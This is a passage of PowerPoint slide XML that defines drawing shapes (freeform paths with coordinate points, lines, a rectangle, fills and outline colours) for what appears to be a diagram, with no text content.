                    <a:pt x="556" y="764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="754"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553" y="744"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="687"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565" y="683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="561" y="675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="671"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="664"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="547" y="659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="552" y="652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="561" y="636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="606"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="570" y="573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="573" y="563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574" y="558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574" y="552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574" y="547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="573" y="543"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="515"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="3333FF"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr rot="10800000"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98322" name="Line 56"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="3965" y="2068"/>
              <a:ext cx="0" cy="14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3" name="Line 57"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4886" y="2334"/>
              <a:ext cx="0" cy="15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4" name="Rectangle 58"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="239" y="378"/>
              <a:ext cx="1446" cy="3074"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="00CC99"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
              <a:endParaRPr lang="en-US" altLang="en-US" sz="1000"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98325" name="Line 59"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1539" y="1833"/>
              <a:ext cx="78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6" name="Line 60"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1539" y="1083"/>
              <a:ext cx="78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7" name="Freeform 61"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1408" y="1528"/>
              <a:ext cx="72" cy="142"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 11846 w 59"/>
                <a:gd name="T1" fmla="*/ 0 h 128"/>
                <a:gd name="T2" fmla="*/ 0 w 59"/>
                <a:gd name="T3" fmla="*/ 0 h 128"/>
                <a:gd name="T4" fmla="*/ 0 w 59"/>
                <a:gd name="T5" fmla="*/ 2118 h 128"/>
                <a:gd name="T6" fmla="*/ 12753 w 59"/>
                <a:gd name="T7" fmla="*/ 2118 h 128"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 59"/>
                <a:gd name="T13" fmla="*/ 0 h 128"/>
                <a:gd name="T14" fmla="*/ 59 w 59"/>
                <a:gd name="T15" fmla="*/ 128 h 128"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="59" h="128">
                  <a:moveTo>
                    <a:pt x="54" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="12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a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98328" name="Freeform 62"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="453" y="1523"/>
              <a:ext cx="226" cy="163"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 59"/>
                <a:gd name="T1" fmla="*/ 0 h 128"/>
                <a:gd name="T2" fmla="*/ 0 w 59"/>
                <a:gd name="T3" fmla="*/ 0 h 128"/>
                <a:gd name="T4" fmla="*/ 0 w 59"/>
                <a:gd name="T5" fmla="*/ 87383 h 128"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 59"/>
                <a:gd name="T7" fmla="*/ 87383 h 128"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 59"/>
                <a:gd name="T13" fmla="*/ 0 h 128"/>
                <a:gd name="T14" fmla="*/ 59 w 59"/>
                <a:gd name="T15" fmla="*/ 128 h 128"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="59" h="128">
                  <a:moveTo>
                    <a:pt x="54" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="12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a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98329" name="Freeform 63"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4518" y="2910"/>
              <a:ext cx="242" cy="427"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 102"/>
                <a:gd name="T1" fmla="*/ 559346 h 324"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 102"/>
                <a:gd name="T3" fmla="*/ 559346 h 324"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 102"/>
                <a:gd name="T5" fmla="*/ 0 h 324"/>
                <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 w 102"/>
                <a:gd name="T10" fmla="*/ 0 h 324"/>
                <a:gd name="T11" fmla="*/ 102 w 102"/>
                <a:gd name="T12" fmla="*/ 324 h 324"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T6">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T7">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T8">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T9" t="T10" r="T11" b="T12"/>
              <a:pathLst>
                <a:path w="102" h="324">
                  <a:moveTo>
                    <a:pt x="0" y="324"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="102" y="324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="0"/>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30" name="Freeform 64"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="315" y="1847"/>
              <a:ext cx="130" cy="418"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 1 w 245"/>
                <a:gd name="T1" fmla="*/ 3802 h 384"/>
                <a:gd name="T2" fmla="*/ 0 w 245"/>
                <a:gd name="T3" fmla="*/ 3802 h 384"/>
                <a:gd name="T4" fmla="*/ 0 w 245"/>
                <a:gd name="T5" fmla="*/ 0 h 384"/>
                <a:gd name="T6" fmla="*/ 1 w 245"/>
                <a:gd name="T7" fmla="*/ 0 h 384"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 245"/>
                <a:gd name="T13" fmla="*/ 0 h 384"/>
                <a:gd name="T14" fmla="*/ 245 w 245"/>
                <a:gd name="T15" fmla="*/ 384 h 384"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="245" h="384">
                  <a:moveTo>
                    <a:pt x="213" y="384"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="A5002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31" name="Freeform 65"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="308" y="935"/>
              <a:ext cx="166" cy="585"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 1 w 245"/>
                <a:gd name="T1" fmla="*/ 33134491 h 384"/>
                <a:gd name="T2" fmla="*/ 0 w 245"/>
                <a:gd name="T3" fmla="*/ 33134491 h 384"/>
                <a:gd name="T4" fmla="*/ 0 w 245"/>
                <a:gd name="T5" fmla="*/ 0 h 384"/>
                <a:gd name="T6" fmla="*/ 1 w 245"/>
                <a:gd name="T7" fmla="*/ 0 h 384"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 245"/>
                <a:gd name="T13" fmla="*/ 0 h 384"/>
                <a:gd name="T14" fmla="*/ 245 w 245"/>
                <a:gd name="T15" fmla="*/ 384 h 384"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="245" h="384">
                  <a:moveTo>
                    <a:pt x="208" y="384"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="A5002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32" name="Freeform 66"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1729" y="936"/>
              <a:ext cx="455" cy="374"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 74843985 w 283"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T2" fmla="*/ 71316632 w 283"/>
                <a:gd name="T3" fmla="*/ 1505851567 h 191"/>
                <a:gd name="T4" fmla="*/ 67367763 w 283"/>
                <a:gd name="T5" fmla="*/ 969624266 h 191"/>
                <a:gd name="T6" fmla="*/ 62830075 w 283"/>
                <a:gd name="T7" fmla="*/ 536220814 h 191"/>
                <a:gd name="T8" fmla="*/ 57948853 w 283"/>
                <a:gd name="T9" fmla="*/ 231415416 h 191"/>
                <a:gd name="T10" fmla="*/ 53429668 w 283"/>
                <a:gd name="T11" fmla="*/ 0 h 191"/>
                <a:gd name="T12" fmla="*/ 48483316 w 283"/>
                <a:gd name="T13" fmla="*/ 0 h 191"/>
                <a:gd name="T14" fmla="*/ 43619392 w 283"/>
                <a:gd name="T15" fmla="*/ 81707760 h 191"/>
                <a:gd name="T16" fmla="*/ 38357876 w 283"/>
                <a:gd name="T17" fmla="*/ 313285124 h 191"/>
                <a:gd name="T18" fmla="*/ 34101033 w 283"/>
                <a:gd name="T19" fmla="*/ 769031148 h 191"/>
                <a:gd name="T20" fmla="*/ 29892883 w 283"/>
                <a:gd name="T21" fmla="*/ 1201202544 h 191"/>
                <a:gd name="T22" fmla="*/ 26061668 w 283"/>
                <a:gd name="T23" fmla="*/ 1813383633 h 191"/>
                <a:gd name="T24" fmla="*/ 22589039 w 283"/>
                <a:gd name="T25" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T26" fmla="*/ 17687529 w 283"/>
                <a:gd name="T27" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T28" fmla="*/ 13319406 w 283"/>
                <a:gd name="T29" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T30" fmla="*/ 9187783 w 283"/>
                <a:gd name="T31" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T32" fmla="*/ 6022202 w 283"/>
                <a:gd name="T33" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T34" fmla="*/ 3280458 w 283"/>
                <a:gd name="T35" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T36" fmla="*/ 1449040 w 283"/>
                <a:gd name="T37" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T38" fmla="*/ 453034 w 283"/>
                <a:gd name="T39" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T40" fmla="*/ 0 w 283"/>
                <a:gd name="T41" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T42" fmla="*/ 453034 w 283"/>
                <a:gd name="T43" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T44" fmla="*/ 1449040 w 283"/>
                <a:gd name="T45" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T46" fmla="*/ 4196045 w 283"/>
                <a:gd name="T47" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T48" fmla="*/ 7128204 w 283"/>
                <a:gd name="T49" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T50" fmla="*/ 10361453 w 283"/>
                <a:gd name="T51" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T52" fmla="*/ 14379804 w 283"/>
                <a:gd name="T53" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T54" fmla="*/ 18863773 w 283"/>
                <a:gd name="T55" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T56" fmla="*/ 23749838 w 283"/>
                <a:gd name="T57" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T58" fmla="*/ 28037494 w 283"/>
                <a:gd name="T59" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T60" fmla="*/ 31777771 w 283"/>
                <a:gd name="T61" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T62" fmla="*/ 35524654 w 283"/>
                <a:gd name="T63" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T64" fmla="*/ 39600986 w 283"/>
                <a:gd name="T65" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T66" fmla="*/ 43964283 w 283"/>
                <a:gd name="T67" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T68" fmla="*/ 48761660 w 283"/>
                <a:gd name="T69" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T70" fmla="*/ 54114927 w 283"/>
                <a:gd name="T71" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T72" fmla="*/ 58913349 w 283"/>
                <a:gd name="T73" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T74" fmla="*/ 63669430 w 283"/>
                <a:gd name="T75" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T76" fmla="*/ 68425964 w 283"/>
                <a:gd name="T77" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T78" fmla="*/ 72964845 w 283"/>
                <a:gd name="T79" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T80" fmla="*/ 76853854 w 283"/>
                <a:gd name="T81" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T82" fmla="*/ 80543799 w 283"/>
                <a:gd name="T83" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T84" fmla="*/ 84768563 w 283"/>
                <a:gd name="T85" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T86" fmla="*/ 88998854 w 283"/>
                <a:gd name="T87" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T88" fmla="*/ 93538787 w 283"/>
                <a:gd name="T89" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T90" fmla="*/ 96822601 w 283"/>
                <a:gd name="T91" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T92" fmla="*/ 99850211 w 283"/>
                <a:gd name="T93" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T94" fmla="*/ 102190778 w 283"/>
                <a:gd name="T95" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T96" fmla="*/ 103391856 w 283"/>
                <a:gd name="T97" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T98" fmla="*/ 104750359 w 283"/>
                <a:gd name="T99" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T100" fmla="*/ 104750359 w 283"/>
                <a:gd name="T101" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T102" fmla="*/ 104017180 w 283"/>
                <a:gd name="T103" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T104" fmla="*/ 102190778 w 283"/>
                <a:gd name="T105" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T106" fmla="*/ 99152684 w 283"/>
                <a:gd name="T107" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T108" fmla="*/ 95745714 w 283"/>
                <a:gd name="T109" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T110" fmla="*/ 91998391 w 283"/>
                <a:gd name="T111" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T112" fmla="*/ 88149013 w 283"/>
                <a:gd name="T113" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T114" fmla="*/ 83327806 w 283"/>
                <a:gd name="T115" fmla="*/ 2147483647 h 191"/>
                <a:gd name="T116" fmla="*/ 78677534 w 283"/>
                <a:gd name="T117" fmla="*/ 2147483647 h 19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83"/>
                <a:gd name="T178" fmla="*/ 0 h 191"/>
                <a:gd name="T179" fmla="*/ 283 w 283"/>
                <a:gd name="T180" fmla="*/ 191 h 191"/>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83" h="191">
                  <a:moveTo>
                    <a:pt x="212" y="33"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="210" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="208" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="205" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204" y="30"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="203" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="202" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="200" y="26"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="199" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198" y="24"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="197" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="195" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="194" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="193" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="192" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="191" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="187" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="182" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="180" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="174" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="172" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171" y="7"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170" y="7"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="2"/>
